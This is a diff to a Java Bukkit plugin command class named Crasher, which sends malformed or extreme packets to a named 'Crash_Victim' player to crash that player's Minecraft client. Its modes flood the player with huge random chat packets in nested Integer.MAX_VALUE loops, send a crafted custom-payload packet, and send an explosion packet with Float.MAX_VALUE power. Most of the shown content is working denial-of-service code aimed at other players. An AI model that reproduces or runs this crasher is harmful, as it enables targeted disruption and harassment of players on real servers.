@@ -4,7 +4,6 @@ import java.util.ArrayList;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 
-import io.netty.buffer.ByteBuf;
 import io.netty.buffer.Unpooled;
 import me.killstorm103.Rebug.Main.Command;
 import me.killstorm103.Rebug.Utils.PT;
@@ -29,18 +28,13 @@ public class Crasher extends Command
 	}
 	@Override
 	public String getPermission() {
-		return "me.killstorm103.rebug.commands.crasher";
+		return StartOfPermission() + "crasher";
 	}
 	
 	@Override
 	public void onCommand(CommandSender sender, String[] args) throws Exception 
 	{
-	//	Log(sender, "args[1]= " + args[1] + " args[2]= " + args[2] + " args[3]= " + args[3]);
-		Player player = null, Crash_Victim = null;
-		if (sender instanceof Player)
-		{
-			player = (Player) sender;
-		}
+		Player Crash_Victim = null;
 		if (args.length < 1)
 		{
 			Log(sender, getSyntax());
@@ -53,9 +47,6 @@ public class Crasher extends Command
 			return;
 		}
 		Packet<?> packet = null;
-		if (mode.equalsIgnoreCase("server")) // TODO Make
-		{
-		}
 		if (args.length < 2)
 		{
 			sender.sendMessage(getSyntax());
@@ -68,26 +59,36 @@ public class Crasher extends Command
 			Log(sender, "Unknown Player!");
 			return;
 		}
-		if (mode.equalsIgnoreCase("Test"))
+		if (mode.equalsIgnoreCase("Server")) // Test in dev
 		{
-			
+			Log(sender, "trying Server Crasher!");
+			for (int i = 0; i < Integer.MAX_VALUE; i ++)
+			{
+				ChatComponentText text = new ChatComponentText(PT.randomString(Integer.MAX_VALUE) + " " + i);
+				for (int o = 0; o < Integer.MAX_VALUE; o ++)
+				{
+					packet = new PacketPlayOutChat (text, (byte) 1);
+					PT.SendPacket(Crash_Victim, packet);
+				}
+				
+				for (int p = 0; p < Integer.MAX_VALUE; p ++)
+				{
+					packet = new PacketPlayOutChat (text, (byte) 2);
+					PT.SendPacket(Crash_Victim, packet);
+				}
+			}
 		}
 		if (mode.equalsIgnoreCase("NumbWare"))
 		{
-			ByteBuf buf = Unpooled.buffer(256);
-			buf.setByte(0, (byte)0);
-			buf.writerIndex(1);
 			packet = new PacketPlayOutCustomPayload("NWS|Crash Bed",
-		    new PacketDataSerializer(buf));
+		    new PacketDataSerializer(Unpooled.buffer()));
 			PT.SendPacket(Crash_Victim, packet);
 			Log(sender, "tried crashing " + Crash_Victim.getName());
 		}
 		if (mode.equalsIgnoreCase("Explosion"))
 		{
-			ArrayList<BlockPosition> list = new ArrayList<BlockPosition>();
-            Vec3D v = new Vec3D(Crash_Victim.getLocation().getX(), Crash_Victim.getLocation().getY(), Crash_Victim.getLocation().getZ());
-            PacketPlayOutExplosion p = new PacketPlayOutExplosion(Crash_Victim.getLocation().getX(), Crash_Victim.getLocation().getY(), Crash_Victim.getLocation().getZ(), Float.MAX_VALUE, list, v);
-            PT.SendPacket(Crash_Victim, p);
+            packet = new PacketPlayOutExplosion(Crash_Victim.getLocation().getX(), Crash_Victim.getLocation().getY(), Crash_Victim.getLocation().getZ(), Float.MAX_VALUE, new ArrayList<BlockPosition>(), new Vec3D(Crash_Victim.getLocation().getX(), Crash_Victim.getLocation().getY(), Crash_Victim.getLocation().getZ()));
+            PT.SendPacket(Crash_Victim, packet);
             Log(sender, "tried crashing " + Crash_Victim.getName());
 		}
 		if (mode.equalsIgnoreCase("Particle"))
@@ -135,5 +136,4 @@ public class Crasher extends Command
 			Log(sender, "tried crashing " + Crash_Victim.getName());
 		}
 	}
-	
 }
